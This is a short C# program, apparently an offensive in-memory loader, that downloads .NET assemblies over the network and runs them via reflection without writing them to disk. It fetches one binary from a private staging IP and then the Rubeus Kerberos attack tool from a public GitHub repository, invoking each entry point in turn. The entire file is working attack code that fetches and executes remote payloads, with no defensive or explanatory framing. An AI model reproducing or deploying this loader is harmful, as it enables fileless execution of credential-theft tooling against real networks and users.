using System;
using System.Net;
using System.Reflection;
using System.Threading;

namespace Frieza
{
    internal class Program
    {
        static void ReflectionFromWeb(string url, int retrycount, int timeoutTimer)
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            WebClient client = new WebClient();
            byte[] programBytes = null;
            while (retrycount >= 0 && programBytes == null)
            {
                try
                {
                    programBytes = client.DownloadData(url);
                }
                catch (WebException ex)
                {
                    Console.WriteLine("Assembly not found yet. Sleeping for {0} sec ans retrying another {1} times(s)...", timeoutTimer, retrycount);
                    retrycount--;
                    Thread.Sleep(timeoutTimer * 1000);
                }
            }
            if (programBytes == null)
            {
                Console.WriteLine("Assembly not found, exiting now ...");
                Environment.Exit(-1);
            }
            Assembly dotnetProgram = Assembly.Load(programBytes);
            object[] parameters = new string[] { null };
            dotnetProgram.EntryPoint.Invoke(null, parameters);
        }

        static void Main(string[] args)
        {
            try
            {
                Console.WriteLine("Hit a key");
                Console.ReadKey();
                ReflectionFromWeb("http://192.168.96.129/mscorlib.exe", 0, 0);
            }
            catch(Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.WriteLine("Could not load mscorlib , exit...");
                Environment.Exit(-1);
            }

            try
            {
                ReflectionFromWeb("https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.5_Any/Rubeus.exe", 3, 5);
                Console.ReadKey();
            }
            catch(Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.ReadKey();
            }
            
        }
    }
}
